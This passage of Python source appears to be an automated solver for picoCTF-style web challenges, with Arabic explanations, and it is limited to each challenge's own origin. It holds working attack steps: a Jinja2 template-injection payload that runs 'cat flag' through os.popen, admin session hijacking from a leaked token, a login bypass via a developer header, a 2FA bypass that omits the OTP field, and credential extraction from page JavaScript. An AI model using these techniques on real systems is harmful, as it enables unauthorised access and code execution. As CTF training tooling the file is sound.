        response = client.request(method, redirected, body=body)
        record(response, [f"متابعة تحويل {response['status']} داخل أصل التحدي مع الحفاظ على POST."])
    return response


def solve_ssti1(client, origin, recon, ev, steps, bodies, record,
                flag_patterns) -> dict:
    res = _base_result(origin, "SSTI1", "ssti1", recognized=True)
    res["steps"] = steps
    res["discovered"] = {"form_action": ev["action"], "input_field": ev["field"],
                         "input_fields": ev["fields"]}
    res["explanation_ar"].append(
        f"اكتُشف نموذج POST فعلي بالحقل «{ev['field']}». نتحقق أولًا بتعبير حسابي غير مدمّر.")
    endpoint = urljoin(origin, ev["action"])
    probe = urlencode({ev["field"]: "{{7*7}}"})
    try:
        r = _request_ssti_form(client, "POST", endpoint, probe, record,
                               "اختبار حسابي آمن داخل حقل النموذج المكتشف.")
    except (OSError, http.client.HTTPException, ValueError) as e:
        res["warnings"].append(f"تعذّر اختبار النموذج أو متابعة تحويله: {e}.")
        return res
    evaluated = "49" in r["body"] and "{{7*7}}" not in r["body"]
    res["discovered"]["ssti_confirmed"] = evaluated
    if not evaluated:
        res["explanation_ar"].append("لم يُثبت الاختبار الحسابي تقييم القالب؛ لم يُرسل طلب قراءة العلم.")
        res["warnings"].append("النموذج موجود، لكن نتيجة 49 غير ظاهرة في الاستجابة.")
        return res
    res["explanation_ar"].append("أعادت الاستجابة 49، فتأكد تقييم تعبير Jinja2.")

    payload = "{{ cycler.__init__.__globals__.os.popen('cat flag').read() }}"
    body = urlencode({ev["field"]: payload})
    try:
        r2 = _request_ssti_form(client, "POST", endpoint, body, record,
                                "إرسال تعبير Jinja2 المعروف لتحدي SSTI1، وقراءة ملف flag في مجلد التحدي.")
    except (OSError, http.client.HTTPException, ValueError) as e:
        res["warnings"].append(f"تعذّرت قراءة ملف العلم المتوقع في تحدي SSTI1: {e}.")
        return res
    flag, source = extract_flag([(f"step{len(steps)}:response", r2["body"])], flag_patterns)
    if flag and 200 <= r2["status"] < 300:
        res["success"], res["flag"] = True, flag
        res["flag_source"] = source or f"HTTP {r2['status']} {ev['action']}"
        res["explanation_ar"].append("استُخرج العلم من استجابة النموذج الفعلية بعد تأكيد SSTI.")
    else:
        res["warnings"].append("لم يظهر علم مطابق في استجابة النموذج.")
        res["explanation_ar"].append("لم يُعلن أي علم لعدم وجوده في الاستجابة.")
    return res


def detect_old_sessions(recon) -> bool:
    r = recon["resp"]
    if r["status"] not in (301, 302, 303, 307, 308):
        return False
    if "/login" not in (r["location"] or ""):
        return False
    return any(c["name"] == "session" and c["intent"] == "set"
               for c in analyze_response_cookies(r))


# --------------------------------------------------------------------------- #
#  محلل Crack the Gate                                                          #
# --------------------------------------------------------------------------- #
def solve_crack_the_gate(client, origin, recon, ev, steps, bodies, record,
                         flag_patterns, opts) -> dict:
    res = _base_result(origin, "Crack the Gate", "crack-the-gate", recognized=True)
    res["steps"] = steps
    warn = res["warnings"]; expl = res["explanation_ar"]

    text_emails = extract_emails(opts.get("challenge_text") or "")
    candidates = text_emails or recon["emails"]
    email = opts.get("email") or (candidates[0] if len(candidates) == 1 else None)
    if not email:
        res["needs_input"] = [{"name": "email", "label_ar": "البريد المستخدم في التحدي", "candidates": candidates}]
        res["explanation_ar"].append("اكتُشف مسار الدخول وترويسة المطوّر؛ يلزم تحديد بريد التحدي قبل إرسال طلب الدخول.")
        return res
    if not isinstance(email, str) or extract_emails(email) != [email]:
        res["warnings"].append("البريد المدخل غير صالح.")
        return res

    expl.append(f"التعليق في الصفحة مُرمّز بـ ROT13؛ بعد فكّه: «{ev['comment_decoded']}».")
    expl.append(f"دلّ التعليق على ترويسة مطوّر تتجاوز البوابة: {ev['dev_header']['name']}: {ev['dev_header']['value']}.")

    login_url = urljoin(origin, ev["login_path"])
    headers = {ev["dev_header"]["name"]: ev["dev_header"]["value"]}
    if ev["json"]:
        headers["Content-Type"] = "application/json"
        body = json.dumps({"email": email, "password": TEST_PASSWORD})
    else:
        body = urlencode({"email": email, "password": TEST_PASSWORD})

    expl.append(f"أرسلنا طلب دخول {'JSON' if ev['json'] else 'نموذجي'} إلى {ev['login_path']} "
                f"بالبريد {email} وبالترويسة المكتشفة (كلمة مرور تجريبية غير محفوظة).")

    try:
        r = client.request(ev["method"] or "POST", login_url, body=body, extra_headers=headers)
    except ValueError as e:
        warn.append(f"رُفض الطلب: {e}.")
        return res
    except (OSError, http.client.HTTPException) as e:
        warn.append(f"تعذّر إرسال طلب الدخول: {e}.")
        return res

    # لا نُظهر كلمة المرور في السجل: نسجّل الاستجابة فقط + ملاحظة عن الترويسة
    record(r, [f"طلب الدخول عبر {ev['method']} {ev['login_path']} بالترويسة "
               f"{ev['dev_header']['name']}: {ev['dev_header']['value']}."])
    res["discovered"] = {
        "comment_raw": ev["comment_raw"], "comment_decoded": ev["comment_decoded"],
        "dev_header": ev["dev_header"], "login_path": ev["login_path"],
        "email_used": email, "response_status": r["status"], "response_content_type": r["content_type"],
    }

    # قراءة الاستجابة الحقيقية
    parsed, success_flag, flag = None, None, None
    flag_response = r
    try:
        parsed = json.loads(r["body"])
    except (json.JSONDecodeError, ValueError):
        parsed = None
    if isinstance(parsed, dict):
        success_flag = parsed.get("success")
        if isinstance(parsed.get("flag"), str):
            flag = parsed["flag"]
    if not flag:
        flag, _src = extract_flag([("login-response", r["body"])], flag_patterns)

    if not (200 <= r["status"] < 300) or success_flag is False:
        flag = None

    # تحويل من نفس الأصل؟ نعيد التحقق ونطلب الوجهة مرة واحدة
    if not flag and r["status"] in (301, 302, 303, 307, 308) and r["location"]:
        try:
            r2 = client.request("GET", urljoin(origin, r["location"]))
            record(r2, ["متابعة تحويل الاستجابة (نفس الأصل) لقراءة العلم."])
            if 200 <= r2["status"] < 300:
                flag, _s2 = extract_flag([("redirect-body", r2["body"])], flag_patterns)
                flag_response = r2
        except ValueError:
            warn.append("التحويل كان لمضيف مختلف؛ أُوقف للحفاظ على أصل التحدي.")
        except (OSError, http.client.HTTPException) as e:
            warn.append(f"تعذّرت متابعة التحويل: {e}.")

    if flag:
        res["success"] = True
        res["flag"] = flag
        res["flag_source"] = f"HTTP {flag_response['status']} على {flag_response['url']}"
        expl.append("أعادت الاستجابة الحقيقية العلم بعد تجاوز البوابة بالترويسة.")
    else:
        if r["status"] == 401 or success_flag is False:
            warn.append(f"رفض الخادم الدخول (الحالة {r['status']})؛ لم يُستخرج علم.")
        elif r["status"] == 404:
            warn.append(f"مسار الدخول {ev['login_path']} غير موجود (404).")
        elif success_flag is True:
            warn.append("نجح الدخول لكن الاستجابة لم تتضمّن علمًا.")
        else:
            warn.append(f"استجابة غير متوقعة (الحالة {r['status']})؛ لم يُستخرج علم.")
        expl.append("لم يُعلَن أي علم لعدم وجود استجابة حقيقية تُثبته.")
    return res


# --------------------------------------------------------------------------- #
#  محلل Old Sessions (مشروط بالأدلة، وسرد يعكس النتائج الفعلية)                  #
# --------------------------------------------------------------------------- #
def solve_old_sessions(client, origin, recon, steps, bodies, record,
                       flag_patterns, opts) -> dict:
    res = _base_result(origin, "Old Sessions", "old-sessions", recognized=True)
    res["steps"] = steps
    warn = res["warnings"]; expl = res["explanation_ar"]
    disc = res["discovered"]

    r1 = recon["resp"]  # مُسجَّل مسبقًا كالخطوة 1
    login_path = r1["location"] or "/login"
    expl.append(f"الصفحة الرئيسية أنشأت كوكي جلسة وحوّلت إلى {login_path}.")

    def finish():
        flag, src = extract_flag(bodies, flag_patterns)
        if flag:
            res["success"] = True; res["flag"] = flag; res["flag_source"] = src
        return res

    # (2) /login — مبرَّر بالتحويل
    try:
        r2 = client.request("GET", urljoin(origin, login_path))
    except (OSError, http.client.HTTPException, ValueError) as e:
        warn.append(f"تعذّر فتح صفحة الدخول: {e}."); return finish()
    record(r2, ["فحص صفحة الدخول: نتوقع نموذجًا ورابط تسجيل."])
    if any(c["intent"] == "deletion" for c in analyze_response_cookies(r2)):
        expl.append("صفحة الدخول حذفت كوكي الجلسة (Max-Age<=0).")
    if "/register" not in r2["body"]:
        warn.append("لا يوجد رابط /register في صفحة الدخول؛ تُوقّف المسار عند الدليل المتاح.")
        return finish()

    # (3) /register — مبرَّر برابط في صفحة الدخول
    reg_url = urljoin(origin, "/register")
    r3 = client.request("GET", reg_url)
    record(r3, ["فحص صفحة التسجيل واكتشاف الحقول."])
    reg_fields = find_form_fields(r3["body"])
    disc["register_fields"] = reg_fields
    if r3["status"] != 200 or not reg_fields:
        warn.append(f"صفحة /register غير متوقعة (الحالة {r3['status']})؛ توقّف المسار.")
        return finish()

    username = opts.get("username") or ("falcon_" + secrets.token_hex(4))
    password = opts.get("password") or secrets.token_hex(8)

    # (اختياري تعليميًا) إثبات أن conf_password مطلوب
    if opts.get("demonstrate_register_requirement") and "conf_password" in reg_fields:
        rp = client.request("POST", reg_url, body=urlencode({"username": username, "password": password}))
        record(rp, ["إثبات المتطلب: تسجيل بدون conf_password — الحالة الفعلية أدناه."])
        if rp["status"] == 400:
            expl.append("تأكّد أن conf_password مطلوب (تسجيل ناقص أعاد 400).")

    # (4) تسجيل صحيح بالحقول المكتشفة فقط
    reg_payload = {"username": username, "password": password}
    if "conf_password" in reg_fields:
        reg_payload["conf_password"] = password
    r4 = client.request("POST", reg_url, body=urlencode(reg_payload))
    record(r4, ["تسجيل حساب تجريبي بالحقول المكتشفة."])
    if r4["status"] not in (200, 302):
        warn.append(f"فشل التسجيل (الحالة {r4['status']})؛ توقّف المسار.")
        return finish()
    expl.append("أنشأنا حسابًا تجريبيًا داخل التحدي.")

    # (5) تسجيل الدخول
    r5 = client.request("POST", urljoin(origin, "/login"),
                        body=urlencode({"username": username, "password": password}))
    record(r5, ["تسجيل الدخول بالحساب التجريبي."])
    own = client.cookies.get("session")
    if r5["status"] not in (200, 302) or not own:
        warn.append(f"تعذّر تسجيل الدخول (الحالة {r5['status']})؛ توقّف المسار.")
        return finish()
    disc["own_session_token"] = _mask(own)
    expl.append("سجّلنا الدخول وحصلنا على كوكي جلسة.")

    # (6) الصفحة الرئيسية بعد الدخول — البحث عن إشارة فعلية
    r6 = client.request("GET", origin)
    record(r6, ["الصفحة الرئيسية بعد الدخول: البحث عن إشارة لصفحة مخفية."])
    hint = find_sessions_hint(r6["body"])
    if not hint:
        warn.append("لم تظهر إشارة إلى صفحة جلسات؛ توقّف المسار.")
        return finish()
    disc["sessions_hint"] = hint
    expl.append(f"الصفحة كشفت إشارة إلى {hint}.")

    # (7) /sessions — مبرَّر بالإشارة
    sess_url = urljoin(origin, hint)
    r7 = client.request("GET", sess_url)
    record(r7, [f"طلب {hint}: نتوقع تسريب جلسات الخادم."])
    disc["sessions_url"] = sess_url
    if r7["status"] != 200:
        warn.append(f"صفحة {hint} غير متاحة (الحالة {r7['status']})؛ توقّف المسار.")
        return finish()
    entries = parse_sessions_dump(r7["body"])
    disc["sessions_count"] = len(entries)
    admin = pick_admin_entry(entries, own)
    expl.append(f"صفحة {hint} سرّبت {len(entries)} جلسة خادم.")
    if not admin:
        warn.append("لم يتحدد رمز جلسة المشرف من التسريب.")
        return finish()
    disc["admin_session_token"] = admin["token"]      # أداة الاستغلال (لا تُعرض في واجهة السجل)
    disc["admin_session_decoded"] = admin["decoded"]

    # (8) انتحال جلسة المشرف
    client.cookies["session"] = admin["token"]
    r8 = client.request("GET", origin)
    record(r8, ["انتحال جلسة المشرف: ضبط كوكي session على الرمز المسرّب ثم طلب /."])
    expl.append("استبدلنا كوكي جلستنا برمز جلسة المشرف المسرّب.")

    out = finish()
    if out["success"]:
        expl.append("استُخرج العلم بصفة مشرف.")
    else:
        warn.append("لم يظهر علم بعد الانتحال؛ راجِع الأدلة.")
    return out


# --------------------------------------------------------------------------- #
#  تحديات تعتمد على مصدر الصفحة/الموارد أو معرّفات معروفة من وصف التحدي          #
# --------------------------------------------------------------------------- #
_STATIC_CHALLENGES = {
    "cookie monster secret recipe": ("Cookie Monster Secret Recipe", "cookie-monster"),
    "ookie monster secret recipe": ("Cookie Monster Secret Recipe", "cookie-monster"),
    "webdecode": ("WebDecode", "webdecode"),
    "unminify": ("Unminify", "unminify"),
    "intro to burp": ("IntroToBurp", "intro-to-burp"),
    "introtoburp": ("IntroToBurp", "intro-to-burp"),
    "bookmarklet": ("Bookmarklet", "bookmarklet"),
    "local authority": ("Local Authority", "local-authority"),
    "inspect html": ("Inspect HTML", "inspect-html"),
    "includes": ("Includes", "includes"),
    "scavenger hunt": ("Scavenger Hunt", "scavenger-hunt"),
    "dont-use-client-side": ("dont-use-client-side", "dont-use-client-side"),
    "don't use client side": ("dont-use-client-side", "dont-use-client-side"),
    "logon": ("logon", "logon"),
    "insp3ct0r": ("Insp3ct0r", "insp3ct0r"),
    "where are the robots": ("where are the robots", "robots"),
    "get ahead": ("GET aHEAD", "get-ahead"),
    "getahead": ("GET aHEAD", "get-ahead"),
    "no fa": ("No FA", "no-fa"),
    "hashgate": ("Hashgate", "hashgate"),
    "credential stuffing": ("Credential Stuffing", "credential-stuffing"),
    "secret box": ("Secret Box", "secret-box"),
    "cookies": ("Cookies", "cookies-2021"),
}

_STATIC_GUIDANCE = {
    "intro-to-burp": "يسجل صقر حسابًا تجريبيًا من النموذج المكتشف. في مرحلة 2FA يرسل POST فارغًا بلا حقل otp، ثم يقرأ العلم من الاستجابة؛ هذا يشرح أثر التحقق من وجود الحقل بدل التحقق من الرمز.",
    "no-fa": "يحتاج هذا التحدي عنوان Instance الحي وملف users.db. رابط users.db ملف بيانات وليس صفحة ويب؛ تُحلّل التجزئات محليًا بقائمة rockyou، ثم يُختبر تسجيل الدخول ومرحلة 2FA على الـInstance فقط.",
    "hashgate": "تُظهر الصفحة معرّف المستخدم؛ افحص تحقق الخادم من المعرّف المجزأ، ثم اختبر معرّفات الموظفين المحدودة التي يثبتها وصف التحدي.",
    "credential-stuffing": "هذا تحدٍ عبر TCP وملف بيانات اعتماد منفصل، وليس صفحة HTTP. شغّل المحلل الطرفي على ملف creds-dump المرفق مع تأخير وحد أقصى للمحاولات ضمن خدمة التحدي فقط.",
    "secret-box": "افحص مصدر التطبيق المرفق. مسار إنشاء السر يضمّن المحتوى في SQL؛ أنشئ حسابًا تدريبيًا واستخدم ثغرة المسار لنسخ سر المشرف، ثم اقرأ السر بحسابك.",
    "bookmarklet": "ابحث عن bookmarklet في المصدر؛ اقرأ دالة فك النص ونفّذ تحويلها محليًا على السلسلة المضمّنة.",
    "local-authority": "يتبع صقر مسار النموذج إلى login.php، ويقرأ secure.js المرتبط، ثم يستخدم الاعتمادين الموجودين فيه لإكمال نموذج المشرف المكتشف.",
    "cookie-monster": "افحص نموذج الدخول والكوكي التي يعيدها الخادم؛ فك الترميز Base64/URL محليًا بعد رصدها.",
    "cookies-2021": "يجرّب صقر قيم كوكي name الرقمية ضمن هذا التحدي، ويتبع تحويلات GET التي يعيدها التطبيق حتى يصل إلى صفحة التحقق؛ تظهر الاستجابات بالتسلسل.",
    "scavenger-hunt": "يتتبع صقر القرائن بين مصدر HTML وCSS وJavaScript وrobots.txt؛ توجّه عبارة Apache وAccess إلى .htaccess، وقرينة Mac وStore إلى .DS_Store. يجمع أجزاء العلم حسب أرقامها.",
    "logon": "يجرب صقر Joe أولًا، ثم يتبع التلميح إن كان التطبيق يتحقق من كلمة مروره وحده. يضبط admin=True قبل اتباع مسار التحويل الذي يكشفه POST، مثل /flag.",
    "get-ahead": "يقرأ صقر مسارات أزرار GET وPOST الظاهرة، ثم يرسل HEAD إلى مسار النموذج نفسه ويفحص رؤوس الاستجابة بحثًا عن العلم.",
    "dont-use-client-side": "يحلل صقر شروط substring الموجودة في JavaScript المضمّن، ويرتب مقاطع كلمة المرور حسب مواقعها لإظهار العلم وشرح أن التحقق يجري في المتصفح.",
}


def detect_named_challenge(challenge_text: str | None):
    text = challenge_text or ""
    # Challenge text is pasted with its title on a standalone first line. Match
    # titles at line starts to avoid treating prose like "this includes ..." as
    # the legacy challenge named Includes.
    for needle in sorted(_STATIC_CHALLENGES, key=len, reverse=True):
        title = re.compile(r"(?im)^\s*(?:#{1,6}\s*)?" + re.escape(needle) + r"(?=\s|$|[—-])")
        if title.search(text):
            return _STATIC_CHALLENGES[needle]
    return None


def _hidden_form_values(html: str) -> dict[str, str]:
    values = {}
    for tag in re.findall(r"<input\b[^>]*>", html, re.I | re.S):
        typ = re.search(r"\btype\s*=\s*(['\"]?)([^\s>'\"]+)\1", tag, re.I)
        name = re.search(r"\bname\s*=\s*(['\"])(.*?)\1", tag, re.I | re.S)
        value = re.search(r"\bvalue\s*=\s*(['\"])(.*?)\1", tag, re.I | re.S)
        if name and value and (not typ or typ.group(2).lower() == "hidden"):
            values[html_lib.unescape(name.group(2))] = html_lib.unescape(value.group(2))
    return values


def solve_intro_to_burp(client, origin, recon, steps, bodies, record,
                        flag_patterns) -> dict:
    res = _base_result(origin, "IntroToBurp", "intro-to-burp", recognized=True)
    res["steps"] = steps
    reg = next((f for f in recon.get("forms", []) if f.get("method") == "POST" and
                {x.lower() for x in f.get("fields", [])}.issuperset(
                    {"full_name", "username", "phone_number", "city", "password"})), None)
    res["discovered"] = {"registration_fields": reg.get("fields", []) if reg else [],
                         "csrf_protected": bool(re.search(r"name=['\"]csrf_token['\"]", recon.get("html", ""), re.I))}
    if not reg:
        res["warnings"].append("لم يظهر نموذج التسجيل المتوقع؛ أوقف صقر التنفيذ دون إرسال بيانات.")
        return res

    values = _hidden_form_values(recon["html"])
    username = "falcon" + secrets.token_hex(5)
    for field in reg["fields"]:
        low = field.lower()
        if field in values:
            continue
        if low == "full_name": values[field] = "Falcon Student"
        elif low == "username": values[field] = username
        elif low == "phone_number": values[field] = "0000000000"
        elif low == "city": values[field] = "Muscat"
        elif low == "password": values[field] = TEST_PASSWORD
        elif low == "submit": values[field] = "Register"
    if not all(any(k.lower() == f for k in values) for f in ("full_name", "username", "phone_number", "city", "password")):
        res["warnings"].append("تعذر ملء حقول التسجيل المكتشفة بأمان؛ لم يُرسل النموذج.")
        return res

    registration_url = urljoin(origin, reg.get("action") or "")
    try:
        posted = client.request("POST", registration_url, urlencode(values))
        record(posted, ["أرسل صقر بيانات تدريبية إلى حقول التسجيل التي كشفها النموذج؛ كلمة المرور لا تُعرض في السجل."])
    except (OSError, http.client.HTTPException, ValueError) as e:
        res["warnings"].append(f"تعذر إرسال التسجيل: {e}")
        return res
    if posted["status"] not in (301, 302, 303, 307, 308) or not posted.get("location"):
        res["warnings"].append("لم يعطِ التسجيل تحويلًا ناجحًا معلنًا؛ لم يُجرّب مسار 2FA.")
        return res
    dashboard_url = urljoin(registration_url, posted["location"])
    if urlsplit(dashboard_url).netloc != urlsplit(origin).netloc:
        res["warnings"].append("حُظر تحويل التسجيل إلى أصل آخر.")
        return res
    try:
        dashboard = client.request("GET", dashboard_url)
        record(dashboard, ["اتبع صقر تحويل التسجيل الذي أعاده الخادم إلى صفحة الخطوة التالية."])
    except (OSError, http.client.HTTPException, ValueError) as e:
        res["warnings"].append(f"تعذر فتح الصفحة التالية: {e}")
        return res
    otp_form = next((f for f in find_forms(dashboard["body"])
                     if f.get("method") == "POST" and any(x.lower() == "otp" for x in f.get("fields", []))), None)
    if not otp_form:
        res["warnings"].append("لم يظهر نموذج POST بحقل otp بعد التسجيل؛ توقف صقر دون تعديل الطلب.")
        return res

    otp_url = urljoin(dashboard_url, otp_form.get("action") or "")
    if urlsplit(otp_url).netloc != urlsplit(origin).netloc:
        res["warnings"].append("حُظر نموذج OTP الذي يشير إلى أصل آخر.")
        return res
    try:
        # Deliberately omit the otp field. This is the challenge's malformed
        # request lesson, and it is reachable only after the challenge title
        # and both real forms have been confirmed.
        otp_hidden = _hidden_form_values(dashboard["body"])
        bypass = client.request("POST", otp_url, urlencode(otp_hidden) if otp_hidden else "")
        record(bypass, ["اختبر صقر خلل IntroToBurp المحدد: أرسل النموذج بلا حقل otp، بعد إثبات وجود النموذج الفعلي."])
    except (OSError, http.client.HTTPException, ValueError) as e:
        res["warnings"].append(f"تعذر إرسال طلب الاختبار: {e}")
        return res
    flag, source = extract_flag([(f"step{len(steps)}:empty-otp-response", bypass["body"])], flag_patterns)
    if not flag and bypass.get("location") and bypass["status"] in (301, 302, 303, 307, 308):
        next_url = urljoin(otp_url, bypass["location"])
        if urlsplit(next_url).netloc == urlsplit(origin).netloc:
            try:
                final = client.request("GET", next_url)
                record(final, ["قراءة الصفحة التي أعلن عنها تحويل نتيجة 2FA ضمن أصل التحدي."])
                flag, source = extract_flag([(f"step{len(steps)}:post-otp-page", final["body"])], flag_patterns)
            except (OSError, http.client.HTTPException, ValueError):
                pass
    if flag:
        res["success"], res["flag"], res["flag_source"] = True, flag, source
        res["explanation_ar"].append("أعاد الخادم العلم بعد طلب POST لا يحتوي حقل otp؛ هذا يثبت خلل التحقق في مسار التحدي.")
    else:
        res["warnings"].append("لم تُرجع استجابة طلب OTP الفارغ علمًا؛ راجع حالة الاستجابة ونصها.")
    return res


def _redact_response_body(resp: dict, secrets_to_hide: list[str]) -> dict:
    safe = dict(resp)
    body = safe.get("body", "")
    for value in sorted({x for x in secrets_to_hide if x}, key=len, reverse=True):
        body = body.replace(value, "[hidden]")
    safe["body"] = body
    return safe


def solve_local_authority(client, origin, recon, steps, bodies, record,
                          flag_patterns) -> dict:
    res = _base_result(origin, "Local Authority", "local-authority", recognized=True)
    res["steps"] = steps
    login_form = next((f for f in recon.get("forms", []) if f.get("method") == "POST" and
                       {x.lower() for x in f.get("fields", [])}.issuperset({"username", "password"})), None)
    res["discovered"] = {"login_fields": login_form.get("fields", []) if login_form else []}
    if not login_form:
        res["warnings"].append("لم يظهر نموذج POST يحوي اسم المستخدم وكلمة المرور؛ لم تُرسل بيانات دخول.")
        return res

    login_url = urljoin(origin, login_form.get("action") or "")
    if urlsplit(login_url).netloc != urlsplit(origin).netloc:
        res["warnings"].append("حُظر نموذج دخول يشير إلى أصل آخر.")
        return res
    try:
        login_page = client.request("GET", login_url)
        record(login_page, ["فتح صقر وجهة نموذج الدخول التي ظهرت في HTML؛ يفحص الصفحة للعثور على تحقق العميل وموارده."])
    except (OSError, http.client.HTTPException, ValueError) as e:
        res["warnings"].append(f"تعذر فتح وجهة النموذج: {e}")
        return res

    scripts = [u for u in _page_resources(login_page["body"], login_url)
               if urlsplit(u).path.lower().endswith(".js")]
    credential_pair = None
    credential_source = None
    for script_url in scripts[:8]:
        try:
            js = client.request("GET", script_url)
            match = re.search(r"function\s+checkPassword\s*\([^)]*\)\s*\{(.*?)\}", js["body"], re.I | re.S)
            if match:
                block = match.group(1)
                um = re.search(r"\busername\s*={2,3}\s*(['\"])([A-Za-z0-9]{1,64})\1", block, re.I)
                pm = re.search(r"\bpassword\s*={2,3}\s*(['\"])([A-Za-z0-9]{1,64})\1", block, re.I)
                if um and pm:
                    credential_pair = (um.group(2), pm.group(2))
                    credential_source = urlsplit(script_url).path
            record(_redact_response_body(js, list(credential_pair or ())),
                   ["قراءة JavaScript مرتبط بصفحة الدخول؛ حُجبت أي بيانات اعتماد من سجل الاستجابة."])
        except (OSError, http.client.HTTPException, ValueError):
            continue
    if not credential_pair:
        res["warnings"].append("لم يعثر صقر في JavaScript المرتبط على مقارنة اسم مستخدم وكلمة مرور؛ لم يجرّب بيانات مخمّنة.")
        return res

    username, password = credential_pair
    res["discovered"]["credential_source"] = credential_source
    res["explanation_ar"].append("وجد صقر المقارنة الصريحة داخل دالة checkPassword في JavaScript؛ لم يخمّن بيانات الدخول.")
    values = {}
    for field in login_form["fields"]:
        low = field.lower()
        if low == "username": values[field] = username
        elif low == "password": values[field] = password
        elif low == "login": values[field] = "Login"
    try:
        login_response = client.request("POST", login_url, urlencode(values))
        reflected_user = re.search(r"window\.username\s*=\s*(['\"])" + re.escape(username) + r"\1", login_response["body"], re.I)
        reflected_pass = re.search(r"window\.password\s*=\s*(['\"])" + re.escape(password) + r"\1", login_response["body"], re.I)
        login_html = login_response["body"]
        form_evidence = next((f for f in find_forms(login_html)
                              if "hash" in [x.lower() for x in f.get("fields", [])] and f.get("action")), None)
        hash_input = None
        for tag in re.findall(r"<input\b[^>]*>", login_html, re.I | re.S):
            name = re.search(r"\bname\s*=\s*(['\"])hash\1", tag, re.I)
            value = re.search(r"\bvalue\s*=\s*(['\"])(.*?)\1", tag, re.I | re.S)
            if name and value:
                hash_input = html_lib.unescape(value.group(2)); break
        if not hash_input:
            hv = re.search(r"adminFormHash['\"]?\s*\)\s*\.value\s*=\s*(['\"])(.*?)\1", login_html, re.I | re.S)
            if hv:
                hash_input = html_lib.unescape(hv.group(2))
        record(_redact_response_body(login_response, [username, password, hash_input or ""]),
               ["أرسل صقر بيانات الاعتماد المطابقة للمصدر إلى نموذج POST المكتشف؛ حُجبت القيم من السجل."])
    except (OSError, http.client.HTTPException, ValueError) as e:
        res["warnings"].append(f"تعذر إرسال بيانات الدخول المكتشفة: {e}")
        return res
    if not (reflected_user and reflected_pass and form_evidence and hash_input):
        res["warnings"].append("لم يؤكد رد login.php بيانات الدخول ونموذج المشرف المخفي؛ توقف صقر.")
        return res

    admin_url = urljoin(login_url, form_evidence["action"])
    if urlsplit(admin_url).netloc != urlsplit(origin).netloc:
        res["warnings"].append("حُظر نموذج المشرف الذي يشير إلى أصل آخر.")
        return res
    admin_data = _hidden_form_values(login_html)
    for field in form_evidence["fields"]:
        if field.lower() == "hash":
            admin_data[field] = hash_input
    if not any(k.lower() == "hash" for k in admin_data):
        res["warnings"].append("تعذر تحديد حقل hash في نموذج المشرف.")
        return res
    try:
        admin_response = client.request("POST", admin_url, urlencode(admin_data))
        record(_redact_response_body(admin_response, [username, password, hash_input]),
               ["أرسل صقر قيمة الحقل من نموذج المشرف الذي أعاده التطبيق، ثم فحص الرد للعلم."])
    except (OSError, http.client.HTTPException, ValueError) as e:
        res["warnings"].append(f"تعذر إرسال نموذج المشرف المكتشف: {e}")
        return res
    flag, source = extract_flag([(f"step{len(steps)}:admin-response", admin_response["body"])], flag_patterns)
    if flag:
        res["success"], res["flag"], res["flag_source"] = True, flag, source
        res["explanation_ar"].append("قبل admin.php قيمة hash الواردة في نموذج HTML الذي أنشأه كود التحقق في جهة العميل.")
    else:
        res["warnings"].append("لم يظهر علم في رد نموذج المشرف؛ راجع الاستجابة المسجلة.")
    return res


def _page_resources(html: str, base_url: str) -> list[str]:
    refs = []
    for tag in re.findall(r"<(?:script|link)\b[^>]*>", html, re.I):
        m = re.search(r"\b(?:src|href)\s*=\s*(['\"])(.*?)\1", tag, re.I | re.S)
        if m:
            url = urljoin(base_url, html_lib.unescape(m.group(2)))
            p = urlsplit(url)
            b = urlsplit(base_url)
            if (p.scheme, p.netloc) == (b.scheme, b.netloc) and url not in refs:
                refs.append(url)
    return refs[:16]


def _decode_cookie_text(text: str) -> list[str]:
    """Try bounded URL/Base64 decoding without logging raw cookie values."""
    import base64
    from urllib.parse import unquote
    out, current = [], text
    for _ in range(3):
        candidate = unquote(current)
        try:
            padded = candidate + "=" * ((4 - len(candidate) % 4) % 4)
            raw = base64.urlsafe_b64decode(padded.encode("ascii"))
            decoded = raw.decode("utf-8")
        except Exception:
            decoded = ""
        if not decoded or decoded == current:
            break
        out.append(decoded)
        current = decoded
    return out


def _simple_js_integer(expression: str, split_value: int | None) -> int | None:
    """Evaluate only integer arithmetic used in substring offsets; never eval JS."""
    try:
        tree = ast.parse(expression.strip(), mode="eval")
    except (SyntaxError, ValueError):
        return None

    def visit(node):
        if isinstance(node, ast.Expression):
            return visit(node.body)
        if isinstance(node, ast.Constant) and isinstance(node.value, int) and not isinstance(node.value, bool):
            return node.value
        if isinstance(node, ast.Name) and node.id == "split" and split_value is not None:
            return split_value
        if isinstance(node, ast.UnaryOp) and isinstance(node.op, (ast.UAdd, ast.USub)):
            value = visit(node.operand)
            return value if value is None or isinstance(node.op, ast.UAdd) else -value
        if isinstance(node, ast.BinOp) and isinstance(node.op, (ast.Add, ast.Sub, ast.Mult, ast.FloorDiv)):
            left, right = visit(node.left), visit(node.right)
            if left is None or right is None or (isinstance(node.op, ast.FloorDiv) and right == 0):
                return None
            if isinstance(node.op, ast.Add): return left + right
            if isinstance(node.op, ast.Sub): return left - right
            if isinstance(node.op, ast.Mult): return left * right
            return left // right
        return None

    return visit(tree)


def _reconstruct_client_side_flag(sources: list[tuple[str, str]], flag_patterns: list[str]):
    joined_sources = "\n".join(body for _label, body in sources)
    split_match = re.search(r"\bsplit\s*=\s*(0[xX][0-9a-fA-F]+|\d+)", joined_sources)
    try:
        split_value = int(split_match.group(1), 0) if split_match else None
    except ValueError:
        split_value = None
    check = re.compile(
        r"\bcheckpass\s*\.\s*substring\s*\(\s*([^,]+)\s*,\s*([^)]*)\)\s*={2,3}\s*(['\"])(.*?)\3",
        re.I | re.S)
    pieces = []
    for match in check.finditer(joined_sources):
        start = _simple_js_integer(match.group(1), split_value)
        end = _simple_js_integer(match.group(2), split_value)
        value = html_lib.unescape(match.group(4))
        if start is not None and end is not None and 0 <= start < end and 0 < len(value) <= end - start:
            pieces.append((start, end, value))
    pieces.sort(key=lambda piece: (piece[0], piece[1]))
    if not pieces:
        return None, None, 0
    # Reject conflicting/overlapping checks and require each recovered fragment
    # to continue exactly where the previous substring ended.
    ordered = [pieces[0]]
    for piece in pieces[1:]:
        previous = ordered[-1]
        if piece[0] < previous[0] + len(previous[2]):
            if piece[0] == previous[0] and piece[2] == previous[2]:
                continue
            return None, None, len(pieces)
        if piece[0] != previous[0] + len(previous[2]):
            return None, None, len(pieces)
        ordered.append(piece)
    candidate = "".join(piece[2] for piece in ordered)
    flag, _ = extract_flag([("client-side substring checks", candidate)], flag_patterns)
    if not flag:
        return None, None, len(pieces)
    return flag, "client-side substring checks", len(ordered)


def _known_challenge_result(client, origin, recon, title, slug, steps, bodies, record,
                            flag_patterns, opts=None) -> dict:
